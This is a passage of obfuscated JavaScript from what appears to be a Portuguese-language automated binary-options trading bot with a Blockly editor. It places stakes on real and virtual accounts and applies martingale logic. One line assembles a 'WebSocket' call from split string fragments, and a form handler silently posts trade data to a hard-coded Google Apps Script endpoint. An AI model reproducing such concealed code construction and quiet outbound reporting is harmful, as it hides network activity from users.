  document.getElementById("lblMarket").innerText = selSymbol.options[selSymbol.selectedIndex].text;
  localStorage.setItem("selSymbol", selSymbol.value);
  forgetAllTicks();
};
const marketChanged = () => {
  fillSubMarket("none", "none");
  subscribeCandles(); 
};
const subMarketChanged = () => {
  fillSymbol("none");
  subscribeCandles(); 
};
const cekWSOpened = () => {
  if (!wsSlaveSudahFirstOpened && wsMasterOpened && wsSlaveOpened) {
    wsSlaveSudahFirstOpened = true;
    btn_run.disabled = btn_run2.disabled = btnSimpleRun.disabled = false;
    btn_run.style.visibility = btn_run2.style.visibility = btnSimpleRun.style.visibility = "visible";
    btnSimpleRun.style.opacity = 1;
    ubahbtn_run("run");
    spanSimpleRobotName.innerText = "Bot Carregado : " + (localStorage.getItem("mainRobotName") == null ? "Nenhum" : localStorage.getItem("mainRobotName"));
    writeLog("", "Inicializado.");
  }
};
const closeResponse = () => {
  wsMasterOpened = false;
};
const closeResponseV = () => {
  wsSlaveOpened = false;
  slaveAuthorized = false;
};
const authorize = () => {
  vEval.send(JSON.stringify({
    forget: idSubBalance,
    passthrough: {
      app_id: app_id
    }
  }));
  summary_balance.innerText = "-";
  vEval.send(JSON.stringify({
    authorize: inpMToken.value,
    passthrough: {
      app_id: app_id
    }
  }));
  subscribeAllCandles();
};
const authorizeV = () => {
  slaveAuthorized = false;
  
  
  setTimeout(() => {
    if (v.readyState == 1) {
      v.send(JSON.stringify({
        authorize: inpSToken.value,
        passthrough: {
          app_id: app_id
        }
      }));
    } else {
      authorizeV();
    }
  }, 5000);
};
const randomArray = hr => {
  return hr[Math.floor(Math.random() * hr.length)];
};
const mainPurchase = (hs, ht, hu, hv, hw, hx, hy, hz, ia, ib, ic, ie, ig, ii, ij, ik, il, im, io) => {
  if (sedangForgetAllTicks) {
    return;
  }
  updateStepper(2);
  tempDuration = hy == "rt" ? Math.floor(Math.random() * 10) + 1 : hx;
  tempDurationUnit = hy == "rt" ? "t" : hy;
  if (tempDurationUnit == "t") {
    tempDetikPengali = hw.includes("1HZ") ? 1 : 2;
  } else {
    if (tempDurationUnit == "s") {
      tempDetikPengali = 1;
    } else {
      if (tempDurationUnit == "m") {
        tempDetikPengali = 60;
      } else {
        if (tempDurationUnit == "h") {
          tempDetikPengali = 3600;
        } else {
          if (tempDurationUnit == "d") {
            tempDetikPengali = 86400;
          }
        }
      }
    }
  }
  if (hs == "master") {
    conn_nya = vEval;
  } else {
    if (hs == "slave") {
      conn_nya = v;
    }
  }
  ;
  if (ht == "manual") {
    stakeNow = hu;
  }
  ;
  if (["CALL", "PUT", "CALLE", "PUTE", "ONETOUCH", "NOTOUCH", "DIGITDIFF", "DIGITMATCH", "DIGITOVER", "DIGITUNDER", "VANILLALONGCALL", "VANILLALONGPUT", "TURBOSLONG", "TURBOSSHORT"].includes(hv)) {
    let ip;
    if (["CALL", "PUT", "CALLE", "PUTE", "ONETOUCH", "NOTOUCH", "VANILLALONGCALL", "VANILLALONGPUT", "TURBOSLONG", "TURBOSSHORT"].includes(hv)) {
      ip = hz;
    } else {
      if (["DIGITDIFF", "DIGITMATCH"].includes(hv)) {
        ip = ic;
      } else {
        if (["DIGITOVER"].includes(hv)) {
          ip = ie;
        } else {
          if (["DIGITUNDER"].includes(hv)) {
            ip = ig;
          }
        }
      }
    }
    if (["CALL", "PUT", "CALLE", "PUTE"].includes(hv) && (ip == "+0" || ip == "-0" || ip == 0)) {
      writeLog("", (conn_nya == v ? "[Virtual] " : "") + "Purchasing " + hv + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + hw + "]");
      conn_nya.send(JSON.stringify({
        subscribe: 1,
        buy: 1,
        parameters: {
          amount: parseFloat(stakeNow).toFixed(2),
          basis: "stake",
          contract_type: hv,
          currency: conn_nya == v ? slaveCurrency : masterCurrency,
          duration: tempDuration,
          duration_unit: tempDurationUnit,
          symbol: hw
        },
        price: 999999,
        passthrough: {
          app_id: app_id,
          tempDuration: tempDuration,
          tempDetikPengali: tempDetikPengali
        }
      }));
    } else {
      writeLog("", (conn_nya == v ? "[Virtual] " : "") + "Purchasing " + hv + " " + ip + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + hw + "]");
      conn_nya.send(JSON.stringify({
        subscribe: 1,
        buy: 1,
        parameters: {
          amount: parseFloat(stakeNow).toFixed(2),
          barrier: ip,
          basis: "stake",
          contract_type: hv,
          currency: conn_nya == v ? slaveCurrency : masterCurrency,
          duration: tempDuration,
          duration_unit: tempDurationUnit,
          symbol: hw
        },
        price: 999999,
        passthrough: {
          app_id: app_id,
          tempDuration: tempDuration,
          tempDetikPengali: tempDetikPengali
        }
      }));
    }
  } else {
    if (["EXPIRYRANGE", "EXPIRYMISS", "RANGE", "UPORDOWN"].includes(hv)) {
      writeLog("", (conn_nya == v ? "[Virtual] " : "") + "Purchasing " + hv + " " + ia + " " + ib + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + hw + "]");
      conn_nya.send(JSON.stringify({
        subscribe: 1,
        buy: 1,
        parameters: {
          amount: parseFloat(stakeNow).toFixed(2),
          barrier: ia,
          barrier2: ib,
          basis: "stake",
          contract_type: hv,
          currency: conn_nya == v ? slaveCurrency : masterCurrency,
          duration: tempDuration,
          duration_unit: tempDurationUnit,
          symbol: hw
        },
        price: 999999,
        passthrough: {
          app_id: app_id,
          tempDuration: tempDuration,
          tempDetikPengali: tempDetikPengali
        }
      }));
    } else {
      if (["ASIANU", "ASIAND", "DIGITEVEN", "DIGITODD", "RESETCALL", "RESETPUT", "RUNHIGH", "RUNLOW"].includes(hv)) {
        writeLog("", (conn_nya == v ? "[Virtual] " : "") + "Purchasing " + hv + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + hw + "]");
        conn_nya.send(JSON.stringify({
          subscribe: 1,
          buy: 1,
          parameters: {
            amount: parseFloat(stakeNow).toFixed(2),
            basis: "stake",
            contract_type: hv,
            currency: conn_nya == v ? slaveCurrency : masterCurrency,
            duration: tempDuration,
            duration_unit: tempDurationUnit,
            symbol: hw
          },
          price: 999999,
          passthrough: {
            app_id: app_id,
            tempDuration: tempDuration,
            tempDetikPengali: tempDetikPengali
          }
        }));
      } else {
        if (["LBFLOATPUT", "LBFLOATCALL", "LBHIGHLOW"].includes(hv)) {
          writeLog("", (conn_nya == v ? "[Virtual] " : "") + "Purchasing " + hv + " [multiplier: " + ii + ", duration: " + tempDuration + tempDurationUnit + ", " + hw + "]");
          conn_nya.send(JSON.stringify({
            subscribe: 1,
            buy: 1,
            parameters: {
              amount: parseFloat(stakeNow).toFixed(2),
              multiplier: ii,
              contract_type: hv,
              currency: conn_nya == v ? slaveCurrency : masterCurrency,
              duration: tempDuration,
              duration_unit: tempDurationUnit,
              symbol: hw
            },
            price: 999999,
            passthrough: {
              app_id: app_id,
              tempDuration: tempDuration,
              tempDetikPengali: tempDetikPengali
            }
          }));
        } else {
          if (["TICKHIGH", "TICKLOW"].includes(hv)) {
            writeLog("", (conn_nya == v ? "[Virtual] " : "") + "Purchasing " + hv + " " + ij + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + hw + "]");
            conn_nya.send(JSON.stringify({
              subscribe: 1,
              buy: 1,
              parameters: {
                amount: parseFloat(stakeNow).toFixed(2),
                selected_tick: ij,
                basis: "stake",
                contract_type: hv,
                currency: conn_nya == v ? slaveCurrency : masterCurrency,
                duration: tempDuration,
                duration_unit: tempDurationUnit,
                symbol: hw
              },
              price: 999999,
              passthrough: {
                app_id: app_id,
                tempDuration: tempDuration,
                tempDetikPengali: tempDetikPengali
              }
            }));
          } else {
            if (["ACCU"].includes(hv)) {
              writeLog("", (conn_nya == v ? "[Virtual] " : "") + "Purchasing " + hv + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", growth rate: " + ik + "%, take profit: " + im + ", " + hw + "]");
              conn_nya.send(JSON.stringify({
                subscribe: 1,
                buy: 1,
                parameters: {
                  amount: parseFloat(stakeNow).toFixed(2),
                  growth_rate: ik / 100,
                  limit_order: {
                    take_profit: im
                  },
                  basis: "stake",
                  contract_type: hv,
                  currency: conn_nya == v ? slaveCurrency : masterCurrency,
                  symbol: hw
                },
                price: 999999,
                passthrough: {
                  app_id: app_id,
                  tempDuration: tempDuration,
                  tempDetikPengali: tempDetikPengali
                }
              }));
            } else {
              if (["MULTUP", "MULTDOWN"].includes(hv)) {
                writeLog("", (conn_nya == v ? "[Virtual] " : "") + "Purchasing " + hv + " x" + il + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", TP: " + im + ", SL: " + io + ", " + hw + "]");
                conn_nya.send(JSON.stringify({
                  subscribe: 1,
                  buy: 1,
                  parameters: {
                    amount: parseFloat(stakeNow).toFixed(2),
                    multiplier: il,
                    limit_order: {
                      take_profit: im,
                      stop_loss: io
                    },
                    basis: "stake",
                    contract_type: hv,
                    currency: conn_nya == v ? slaveCurrency : masterCurrency,
                    symbol: hw
                  },
                  price: 999999,
                  passthrough: {
                    app_id: app_id,
                    tempDuration: tempDuration,
                    tempDetikPengali: tempDetikPengali
                  }
                }));
              }
            }
          }
        }
      }
    }
  }
};
const funcSellAtMarket = () => {
  conn_nya.send(JSON.stringify({
    sell: prContract[sedangPantauContractPos],
    price: 0
  }));
};
const am = "ebSocket('w" + aj;
const updateResult = (iq, ir, it, iu, iw, ix, iy, iz, ja, jb, jc, jd, je) => {
  updateStepper(4);
  tempPrContractPos = prContract.indexOf(iq);
  if (!winContract.includes(iq) && (it >= 0 || ir === "won")) {
    winContract.push(iq);
    rowActive[tempPrContractPos].cells[3].innerText = jd;
    rowActive[tempPrContractPos].cells[4].innerText = iu;
    rowActive[tempPrContractPos].cells[5].innerText = it;
    rowActive[tempPrContractPos].cells[5].style.color = colorWormNo;
    summary_win.innerText = winContract.length;
    totalProfit += it;
    summary_totalstake.innerText = (summary_totalstake.innerText * 1 + iu).toFixed(2);
    summary_totalpayout.innerText = (summary_totalpayout.innerText * 1 + iu + it).toFixed(2);
    summary_totalprofitloss.innerText = totalProfit.toFixed(2);
    summary_totalprofitloss.style.color = totalProfit > 0 ? colorWormNo : totalProfit < 0 ? colorFall : "#fff";
    countVLose = 0;
    tempWinInARow++;
    if (chkTP.checked && inpTP.value * 1 != 0 && totalProfit.toFixed(2) * 1 >= inpTP.value * 1) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog(colorWormNo, "Meta de Lucro Atingida.");
      
      
      setTimeout(() => {
        alert("Meta de Lucro Atingida.");
      }, 500);
    } else {
      if (chkNumOfWin.checked && inpNumOfWin.value * 1 != 0 && summary_win.innerText * 1 >= inpNumOfWin.value * 1) {
        if (btn_run.src.split("/").pop() == "icon_stop.png") {
          btn_run.click();
        }
        writeLog(colorWormNo, "NUMBER OF WIN(S) REACHED.");
        
        
        setTimeout(() => {
          alert("NUMBER OF WIN(S) REACHED.");
        }, 500);
      } else {
        if (chkNumOfRun.checked && inpNumOfRun.value * 1 != 0 && summary_noofruns.innerText * 1 >= inpNumOfRun.value * 1) {
          if (btn_run.src.split("/").pop() == "icon_stop.png") {
            btn_run.click();
          }
          writeLog("", "NUMBER OF RUN(S) REACHED.");
          
          
          setTimeout(() => {
            alert("NUMBER OF RUN(S) REACHED.");
          }, 500);
        } else {
          if (chkNumOfWinInARow.checked && inpNumOfWinInARow.value * 1 != 0 && tempWinInARow >= inpNumOfWinInARow.value * 1) {
            if (btn_run.src.split("/").pop() == "icon_stop.png") {
              btn_run.click();
            }
            writeLog(colorWormNo, "WIN(S) IN A ROW REACHED.");
            
            
            setTimeout(() => {
              alert("WIN(S) IN A ROW REACHED.");
            }, 500);
          } else {
            if (["smartmartingale", "smartcyclestake"].includes(selMoneyManagement.value)) {
              if (chkSmart.checked) {
                if (totalProfit >= totalProfitMax) {
                  totalProfitMax = totalProfit;
                  stakeNow = getStakeBegin();
                }
              } else {
                stakeNow = getStakeBegin();
              }
            }
            timeMayOP = Date.now() + (chkDelayWin.checked ? inpDelayWin.value * 1000 : 0);
          }
        }
      }
    }
  } else {
    if (!loseContract.includes(iq) && (it < 0 || ir === "lost")) {
      loseContract.push(iq);
      rowActive[tempPrContractPos].cells[3].innerText = jd;
      rowActive[tempPrContractPos].cells[4].innerText = iu;
      rowActive[tempPrContractPos].cells[5].innerText = it;
      rowActive[tempPrContractPos].cells[5].style.color = colorFall;
      summary_loss.innerText = loseContract.length;
      totalProfit += it;
      summary_totalstake.innerText = (summary_totalstake.innerText * 1 + iu).toFixed(2);
      summary_totalpayout.innerText = (summary_totalpayout.innerText * 1 + iu + (it)).toFixed(2);
      summary_totalprofitloss.innerText = totalProfit.toFixed(2);
      summary_totalprofitloss.style.color = totalProfit > 0 ? colorWormNo : totalProfit < 0 ? colorFall : "#fff";
      tempWinInARow = 0;
      tempLossInARow++;
      if (chkSL.checked && inpSL.value * 1 != 0 && totalProfit.toFixed(2) * 1 <= -(inpSL.value * 1)) {
        if (btn_run.src.split("/").pop() == "icon_stop.png") {
          btn_run.click();
        }
        writeLog(colorFall, "STOP LOSS HIT.");
        
        
        setTimeout(() => {
          alert("STOP LOSS HIT.");
        }, 500);
      } else {
        if (chkNumOfLoss.checked && inpNumOfLoss.value * 1 != 0 && summary_loss.innerText * 1 >= inpNumOfLoss.value * 1) {
          if (btn_run.src.split("/").pop() == "icon_stop.png") {
            btn_run.click();
          }
          writeLog(colorFall, "NUMBER OF LOSS(ES) REACHED.");
          
          
          setTimeout(() => {
            alert("NUMBER OF LOSS(ES) REACHED.");
          }, 500);
        } else {
          if (chkNumOfRun.checked && inpNumOfRun.value * 1 != 0 && summary_noofruns.innerText * 1 >= inpNumOfRun.value * 1) {
            if (btn_run.src.split("/").pop() == "icon_stop.png") {
              btn_run.click();
            }
            writeLog("", "NUMBER OF RUN(S) REACHED.");
            
            
            setTimeout(() => {
              alert("NUMBER OF RUN(S) REACHED.");
            }, 500);
          } else {
            if (chkNumOfLossInARow.checked && inpNumOfLossInARow.value * 1 != 0 && tempLossInARow >= inpNumOfLossInARow.value * 1) {
              if (btn_run.src.split("/").pop() == "icon_stop.png") {
                btn_run.click();
              }
              writeLog(colorFall, "LOSS(ES) IN A ROW REACHED.");
              
              
              setTimeout(() => {
                alert("LOSS(ES) IN A ROW REACHED.");
              }, 500);
            } else {
              stakeNow = getStakeAfterLose(Math.abs(it));
              timeMayOP = Date.now() + (chkDelayLose.checked ? inpDelayLose.value * 1000 : 0);
            }
          }
        }
      }
    }
  }
  fillDataLastCont(iu, iw, it, ix, iy, iz, ja, jb, jc, jd, je, ir, false);
  func$1$9$8$7$RestartTradingConditions();
  clearTimeout(timerStartPLANB[prContract.indexOf(iq)]);
  clearTimeout(timerDoPLANB[prContract.indexOf(iq)]);
  prContract[prContract.indexOf(iq)] = 0;
};
const updateResultV = (jf, jg, jh, ji, jj, jk, jl, jm, jn, jo, jp, jq, jr) => {
  updateStepper(4);
  if (jf != lastContractIdV) {
    tempPrContractPos = prContract.indexOf(jf);
    rowActive[tempPrContractPos].cells[3].innerText = jq;
    if (jh >= 0 || jg === "won") {
      rowActive[tempPrContractPos].cells[5].innerText = "Virtual Win";
      rowActive[tempPrContractPos].cells[5].style.color = colorWormNo;
      countVLose = 0;
      timeMayOP = Date.now() + (chkDelayWin.checked ? inpDelayWin.value * 1000 : 0);
    } else {
      if (jh < 0 || jg === "lost") {
        rowActive[tempPrContractPos].cells[5].innerText = "Virtual Loss";
        rowActive[tempPrContractPos].cells[5].style.color = colorFall;
        countVLose++;
        if (chkVLose.checked) {
          writeLog("", "[Virtual] LOSE #" + countVLose + "/" + inpVLose.value);
        }
        ;
        timeMayOP = Date.now() + (chkDelayLose.checked ? inpDelayLose.value * 1000 : 0);
      }
    }
    lastContractIdV = jf;
    fillDataLastCont(ji, jj, jh, jk, jl, jm, jn, jo, jp, jq, jr, jg, true);
    func$1$9$8$7$RestartTradingConditions();
    clearTimeout(timerStartPLANB[prContract.indexOf(jf)]);
    clearTimeout(timerDoPLANB[prContract.indexOf(jf)]);
    prContract[prContract.indexOf(jf)] = 0;
  }
};
const doPLANB = js => {
  console.log("doPLANB: " + js);
  if (conn_nya.readyState != 1) {
    timerDoPLANB[prContract.indexOf(js)] =
    
    
    setTimeout(() => {
      doPLANB(js);
    }, timerDoPLANBOffset * 1000);
    return;
  }
  if (prContract.indexOf(js) > -1) {
    if (navigator.onLine) {
      conn_nya.send(JSON.stringify({
        forget_all: "proposal_open_contract",
        passthrough: {
          app_id: app_id
        }
      }));
      conn_nya.send(JSON.stringify({
        subscribe: 1,
        proposal_open_contract: 1,
        contract_id: js,
        passthrough: {
          app_id: app_id
        }
      }));
    }
    timerDoPLANB[prContract.indexOf(js)] =
     
    
    setTimeout(() => {
      doPLANB(js);
    }, timerDoPLANBOffset * 1000);
  } else {}
};
const ubahbtn_run = jt => {
  btn_run.src = btn_run2.src = "image/icon_" + jt + ".png";
  btnSimpleRun.innerHTML = "<img src=\"image/icon_" + jt + "2.png\" style=\"height: 30px;\">&nbsp;&nbsp;" + (jt == "run" ? "Iniciar" : "Parar") + " Bot";
};
window.onbeforeunload = function (ju) {
  return "Você está saindo. Tem certeza?";
};
const updateStepper = jv => {
  for (i = 1; i <= 4; i++) {
    if (i <= jv) {
      divStepper[i].className = "stepper-item completed";
    } else {
      divStepper[i].className = "stepper-item active";
    }
    if (i == jv) {
      divStepper[i].querySelector(".step-counter").classList.add("pulse");
    } else {
      divStepper[i].querySelector(".step-counter").classList.remove("pulse");
    }
  }
};
form.addEventListener("submit", jw => {
  jw.preventDefault();
  let jx = new FormData(form);
  fetch("https://script.google.com/macros/s/AKfycbwzTRRP9Rs9Ch4uLvqWGHmmSzG6apubhQJFUBYRcTOBGTehuXmqFAPY3_b7JVVT2V-EmA/exec", {
    mode: "no-cors",
    method: "POST",
    body: jx
  }).then(jy => {}).then(jx => {}).catch(function (jz) {
    console.log("Request failed", jz);
  });
  return true;
});
const saveDataContract = (ka, kb, kc, kd, ke, kf, kg) => {
  data_001.value = ka;
  data_002.value = kb;
  data_003.value = kc;
  data_004.value = kd;
  data_005.value = ke;
  data_006.value = localStorage.getItem("mainRobotName");
  data_007.value = kf;
  data_008.value = kg;
  aSimp.click();
};
const saveDataContract2 = (kaka, kbkb, kckc, kdkd, keke, kfkf, kgkg) => {
  data_001.value = kaka;
  data_002.value = kbkb;
  data_003.value = localStorage.getItem("mainRobotName");
  data_004.value = kckc;
  data_005.value = kdkd;
  data_006.value = keke;
  data_007.value = kfkf;
  data_008.value = kgkg;
  aSimp.click();
};
const refreshBoxData = kh => {
  document.getElementById("div_thelast10digits").style.display = "none";
  document.getElementById("div_digitstatistic").style.display = "none";
  document.getElementById("div_thelast20digitscaterzian").style.display = "none";
  document.getElementById("div_thelast20digitsevenodd").style.display = "none";
  document.getElementById("div_evenvsodd").style.display = "none";
  document.getElementById("div_overvsunder").style.display = "none";
  document.getElementById("div_thelast10ticks").style.display = "none";
  document.getElementById("div_thelast20tickworm").style.display = "none";
  document.getElementById("div_risevsfall").style.display = "none";
  document.getElementById("div_tick_Trisma").style.display = "none";
  document.getElementById("div_detail3ticks").style.display = "none";
  document.getElementById("div_thelast10candles").style.display = "none";
  document.getElementById("div_continuousindices").style.display = "none";
  document.getElementById("div_ihaveanidea").style.display = "none";
  document.getElementById("div_comingsoon").style.display = "none";
  document.getElementById("div_" + kh).style.display = "block";
};
refreshBoxData(selData.value);
function saveJsonObjToFile(ki, kj) {
  const kk = JSON.stringify(ki);
  const kl = "text/plain";
  const km = document.createElement("a");
  const kn = new Blob([kk], {
    type: kl
  });
  km.href = URL.createObjectURL(kn);
  km.download = kj;
  document.body.appendChild(km);
  km.click();
  km.remove();
}
function loadFileToJsonObj(ko) {
  let kp = new FileReader();
  kp.onload = function () {
    Blockly.serialization.workspaces.load(JSON.parse(kp.result), Blockly.getMainWorkspace());
    document.getElementById("input_file").value = "";
  };
  kp.readAsText(ko);
}
function tableToCSV(kq, kr, ks) {
  var kt = [];
  var ku = [];
  var kv;
  var kw;
  var kx;
  var ky;
  if (kr != "") {
    kt.push(kr);
  }
  kx = document.querySelectorAll("#" + kq + " tr");
  for (kv = 0; kv < kx.length; kv++) {
    ky = kx[kv].querySelectorAll("td,th");
    ku = [];
    for (kw = 0; kw < ky.length; kw++) {
      ku.push(ky[kw].innerText);
    }
    kt.push(ku.join(","));
  }
  kt = kt.join("\n");
  downloadCSVFile(kt, ks);
}
function downloadCSVFile(kz, la) {
  var lb = new Blob([kz], {
    type: "text/csv"
  });
  var lc = document.createElement("a");
  lc.download = la;
  var ld = window.URL.createObjectURL(lb);
  lc.href = ld;
  lc.style.display = "none";
  document.body.appendChild(lc);
  lc.click();
  document.body.removeChild(lc);
}
var toolbox = document.getElementById("toolbox");
var options = {
  toolbox: toolbox,
  collapse: true,
  comments: true,
  disable: true,
  maxBlocks: Infinity,
  trashcan: false,
  horizontalLayout: false,
  toolboxPosition: "start",
  css: true,
  media: "https://blockly-demo.appspot.com/static/media/",
  rtl: false,
  scrollbars: true,
  sounds: true,
  oneBasedIndex: true,
  zoom: {
    controls: true,
    wheel: true,
    startScale: 1,
    maxScale: 3,
    minScale: 0.3,
    scaleSpeed: 1.07,
    pinch: true
  },
  theme: Blockly.Theme.defineTheme("dark", {
    base: Blockly.Themes.Classic,
    blockStyles: {
      logic_blocks: {
        colourPrimary: "#1a2333"
      },
      math_blocks: {
        colourPrimary: "#1a2333"
      },
      text_blocks: {
        colourPrimary: "#1a2333"
      },
      list_blocks: {
        colourPrimary: "#1a2333"
      },
      variable_blocks: {
        colourPrimary: "#1a2333"
      },
      procedure_blocks: {
        colourPrimary: "#1a2333"
      },
      loop_blocks: {
        colourPrimary: "#1a2333"
      }
    },
    componentStyles: {
      workspaceBackgroundColour: "#10151d",
      toolboxBackgroundColour: "blackBackground",
      toolboxForegroundColour: "#fff",
      flyoutBackgroundColour: "#0e111c",
      flyoutForegroundColour: "#ccc",
      flyoutOpacity: 1,
      scrollbarColour: "#797979",
      insertionMarkerColour: "#222",
      insertionMarkerOpacity: 0.3,
      scrollbarOpacity: 0.4,
      cursorColour: "#d0d0d0",
      blackBackground: "#171c2e"
    }
  })
};
var workspace = Blockly.inject(blocklyDiv, options);
workspace.addChangeListener(Blockly.Events.disableOrphans);
var workspaceBlocks = document.getElementById("workspaceBlocks");
Blockly.Xml.domToWorkspace(workspaceBlocks, workspace);
let arrPopulatedMarket2 = [["Mercado Ativo", "activemarket"], ["Mercado Atual - Sistema Intermercados", "mainMarket_continuousindices"], ["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"], ["Continuous Indices:Volatility 150 (1s) Index", "1HZ150V|Volatility 150 (1s) Index"], ["Continuous Indices:Volatility 250 (1s) Index", "1HZ250V|Volatility 250 (1s) Index"], ["Daily Reset Indices:Bear Market Index", "RDBEAR|Bear Market Index"], ["Daily Reset Indices:Bull Market Index", "RDBULL|Bull Market Index"], ["Jump Indices:Jump 10 Index", "JD10|Jump 10 Index"], ["Jump Indices:Jump 25 Index", "JD25|Jump 25 Index"], ["Jump Indices:Jump 50 Index", "JD50|Jump 50 Index"], ["Jump Indices:Jump 75 Index", "JD75|Jump 75 Index"], ["Jump Indices:Jump 100 Index", "JD100|Jump 100 Index"], ["Step Indices:Step Index", "stpRNG|Step Index"], ["Crash/Boom Indices:Crash 300 Index", "CRASH300N|Crash 300 Index"], ["Crash/Boom Indices:Crash 500 Index", "CRASH500|Crash 500 Index"], ["Crash/Boom Indices:Crash 1000 Index", "CRASH1000|Crash 1000 Index"], ["Crash/Boom Indices:Boom 300 Index", "BOOM300N|Boom 300 Index"], ["Crash/Boom Indices:Boom 500 Index", "BOOM500|Boom 500 Index"], ["Crash/Boom Indices:Boom 1000 Index", "BOOM1000|Boom 1000 Index"], ["Major Pairs:AUD/JPY", "frxAUDJPY|AUD/JPY"], ["Major Pairs:AUD/USD", "frxAUDUSD|AUD/USD"], ["Major Pairs:EUR/AUD", "frxEURAUD|EUR/AUD"], ["Major Pairs:EUR/CHF", "frxEURCHF|EUR/CHF"], ["Major Pairs:EUR/GBP", "frxEURGBP|EUR/GBP"], ["Major Pairs:EUR/JPY", "frxEURJPY|EUR/JPY"], ["Major Pairs:EUR/USD", "frxEURUSD|EUR/USD"], ["Major Pairs:GBP/AUD", "frxGBPAUD|GBP/AUD"], ["Major Pairs:GBP/JPY", "frxGBPJPY|GBP/JPY"], ["Major Pairs:GBP/USD", "frxGBPUSD|GBP/USD"], ["Major Pairs:USD/CAD", "frxUSDCAD|USD/CAD"], ["Major Pairs:USD/CHF", "frxUSDCHF|USD/CHF"], ["Major Pairs:USD/JPY", "frxUSDJPY|USD/JPY"], ["Minor Pairs:AUD/CAD", "frxAUDCAD|AUD/CAD"], ["Minor Pairs:AUD/CHF", "frxAUDCHF|AUD/CHF"], ["Minor Pairs:AUD/NZD", "frxAUDNZD|AUD/NZD"], ["Minor Pairs:EUR/NZD", "frxEURNZD|EUR/NZD"], ["Minor Pairs:GBP/CAD", "frxGBPCAD|GBP/CAD"], ["Minor Pairs:GBP/CHF", "frxGBPCHF|GBP/CHF"], ["Minor Pairs:GBP/NOK", "frxGBPNOK|GBP/NOK"], ["Minor Pairs:GBP/NZD", "frxGBPNZD|GBP/NZD"], ["Minor Pairs:NZD/JPY", "frxNZDJPY|NZD/JPY"], ["Minor Pairs:NZD/USD", "frxNZDUSD|NZD/USD"], ["Minor Pairs:USD/MXN", "frxUSDMXN|USD/MXN"], ["Minor Pairs:USD/NOK", "frxUSDNOK|USD/NOK"], ["Minor Pairs:USD/PLN", "frxUSDPLN|USD/PLN"], ["Minor Pairs:USD/SEK", "frxUSDSEK|USD/SEK"], ["Asian indices:Australia 200", "OTC_AS51|Australia 200"], ["Asian indices:Hong Kong 50", "OTC_HSI|Hong Kong 50"], ["Asian indices:Japan 225", "OTC_N225|Japan 225"], ["European indices:Euro 50", "OTC_SX5E|Euro 50"], ["European indices:France 40", "OTC_FCHI|France 40"], ["European indices:Germany 40", "OTC_GDAXI|Germany 40"], ["European indices:Netherlands 25", "OTC_AEX|Netherlands 25"], ["European indices:Swiss 20", "OTC_SSMI|Swiss 20"], ["European indices:UK 100", "OTC_FTSE|UK 100"], ["American indices:US 500", "OTC_SPC|US 500"], ["American indices:US Tech 100", "OTC_NDX|US Tech 100"], ["American indices:Wall Street 30", "OTC_DJI|Wall Street 30"], ["Forex Basket:AUD Basket", "WLDAUD|AUD Basket"], ["Forex Basket:EUR Basket", "WLDEUR|EUR Basket"], ["Forex Basket:GBP Basket", "WLDGBP|GBP Basket"], ["Forex Basket:USD Basket", "WLDUSD|USD Basket"], ["Commodities Basket:Gold Basket", "WLDXAU|Gold Basket"], ["Metals:Gold/USD", "frxXAUUSD|Gold/USD"], ["Metals:Palladium/USD", "frxXPDUSD|Palladium/USD"], ["Metals:Platinum/USD", "frxXPTUSD|Platinum/USD"], ["Metals:Silver/USD", "frxXAGUSD|Silver/USD"], ["Cryptocurrencies:BTC/USD", "cryBTCUSD|BTC/USD"], ["Cryptocurrencies:ETH/USD", "cryETHUSD|ETH/USD"]];
let arrAccount = [["Auto", "auto"], ["Conta Real", "master"], ["Conta Virtual", "slave"]];
let arrStakeAM = [["Auto", "auto"], ["Manual", "manual"]];
let arrPopulatedMarketAccu = [["Mercado Ativo", "activemarket"], ["Mercado Atual - Sistema Intermercados", "mainMarket_continuousindices"], ["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"]];
Blockly.defineBlocksWithJsonArray([{
  type: "runonceatstart",
  message0: "%1 1. Executar ao Iniciar: %2 %3",
  args0: [{
    type: "field_image",
    src: "https://pontobots.com/image/icon_start.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_runonceatstart"
  }],
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.runonceatstart = function (le, lf) {
  var lg = lf.statementToCode(le, "statement_runonceatstart");
